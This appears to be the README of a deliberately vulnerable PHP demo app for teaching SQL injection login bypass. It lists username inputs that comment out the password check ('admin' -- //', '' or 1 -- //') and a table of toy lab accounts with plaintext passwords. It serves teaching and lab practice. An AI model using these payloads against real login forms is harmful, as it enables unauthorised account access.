# SQL Injection Login Bypass Example

This is a simple app written in PHP that can be used to demonstrate how SQL injection vulnerabilities can be used to bypass a login page.

### Input
username: admin' -- // 
password: anythinghere

username: ' or 1 -- // 
password: anythinghere

username: suresh' -- // 
password: anythinghere

### Valid accounts
admin:admin
bob:password
suresh:troll
ramesh:troll
alice:alice1
voldemort:horcrux
frodo:frodo
hodor:hodor
rhombus:rhombus